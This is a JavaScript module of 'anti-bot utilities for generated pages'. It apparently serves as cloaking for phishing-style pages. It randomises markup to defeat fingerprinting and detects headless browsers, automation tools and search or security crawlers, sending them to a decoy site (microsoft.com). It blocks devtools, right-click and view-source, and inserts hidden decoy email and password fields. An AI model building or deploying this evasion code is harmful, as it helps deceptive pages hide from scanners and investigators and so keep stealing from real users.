/**
 * Anti-Bot Utilities for Generated Pages
 * Provides obfuscation and bot detection evasion
 */

// Generate random alphanumeric ID with prefix
function randomId(prefix = 'el') {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let id = prefix + '_';
    for (let i = 0; i < 8; i++) {
        id += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return id;
}

// Generate random HTML comment to vary page structure
function randomComment() {
    const comments = [
        '<!-- Page structure -->',
        '<!-- Content section -->',
        '<!-- Main container -->',
        '<!-- UI Elements -->',
        '<!-- Form section -->',
        '<!-- Interactive elements -->',
        '<!-- Layout wrapper -->',
        ''  // Sometimes no comment
    ];
    return comments[Math.floor(Math.random() * comments.length)];
}

// Randomize whitespace in HTML to defeat fingerprinting
function randomizeWhitespace(html) {
    // Random number of spaces/newlines between tags
    return html.replace(/>\s+</g, () => {
        const spaces = Math.floor(Math.random() * 3);
        const newlines = Math.floor(Math.random() * 2);
        return '>' + '\n'.repeat(newlines) + ' '.repeat(spaces) + '<';
    });
}

// Generate bot detection script (inline)
function getBotDetectionScript() {
    return `
    // Bot/Crawler Detection
    (function() {
        var isBot = false;
        var reasons = [];
        
        // Check for headless browser indicators
        if (navigator.webdriver) { isBot = true; reasons.push('webdriver'); }
        if (!window.chrome && /Chrome/.test(navigator.userAgent)) { isBot = true; reasons.push('fake_chrome'); }
        if (navigator.languages && navigator.languages.length === 0) { isBot = true; reasons.push('no_languages'); }
        
        // Check for automation tools
        if (window._phantom || window.__nightmare || window.callPhantom) { isBot = true; reasons.push('phantom'); }
        if (document.__selenium_unwrapped || document.__webdriver_evaluate) { isBot = true; reasons.push('selenium'); }
        if (navigator.plugins.length === 0 && !/Mobile|Android/.test(navigator.userAgent)) { isBot = true; reasons.push('no_plugins'); }
        
        // Check for Googlebot/crawlers via user agent
        var botUA = /(googlebot|bingbot|yandex|baiduspider|duckduckbot|slurp|facebookexternalhit|petalbot|semrushbot|ahrefsbot)/i;
        if (botUA.test(navigator.userAgent)) { isBot = true; reasons.push('crawler_ua'); }
        
        // Check for VPN/Proxy indicators (limited client-side)
        if (window.RTCPeerConnection) {
            try {
                var pc = new RTCPeerConnection({iceServers:[]});
                pc.createDataChannel('');
                pc.createOffer().then(function(sdp){ pc.setLocalDescription(sdp); });
            } catch(e) { /* WebRTC blocked - possible VPN */ }
        }
        
        // If bot detected, redirect or block
        if (isBot) {
            console.log('🤖 Bot detected:', reasons);
            // Redirect to decoy
            setTimeout(function() {
                window.location.href = 'https://www.microsoft.com';
            }, 100);
        }
    })();`;
}

// Generate anti-debugging script
function getAntiDebugScript() {
    return `
    // Anti-debugging measures
    (function() {
        var devtools = { open: false };
        var threshold = 160;
        
        setInterval(function() {
            if (window.outerHeight - window.innerHeight > threshold ||
                window.outerWidth - window.innerWidth > threshold) {
                devtools.open = true;
            }
        }, 500);
        
        // Disable right-click
        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
        
        // Block common shortcuts
        document.addEventListener('keydown', function(e) {
            if ((e.ctrlKey || e.metaKey) && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S')) {
                e.preventDefault();
            }
            if (e.key === 'F12') { e.preventDefault(); }
        });
    })();`;
}

// Generate randomized class names
function randomClass(base = 'cls') {
    const suffix = Math.random().toString(36).substring(2, 8);
    return `${base}_${suffix}`;
}

// Generate fake/decoy elements to confuse scrapers
function getDecoyElements() {
    const decoys = [];
    const count = Math.floor(Math.random() * 3) + 1;
    for (let i = 0; i < count; i++) {
        decoys.push(`<div style="display:none!important;position:absolute;left:-9999px" aria-hidden="true" data-decoy="true">
            <input type="text" name="email_${randomId()}" tabindex="-1" autocomplete="off">
            <input type="password" name="pass_${randomId()}" tabindex="-1" autocomplete="off">
        </div>`);
    }
    return decoys.join('\n');
}

module.exports = {
    randomId,
    randomComment,
    randomizeWhitespace,
    getBotDetectionScript,
    getAntiDebugScript,
    randomClass,
    getDecoyElements
};
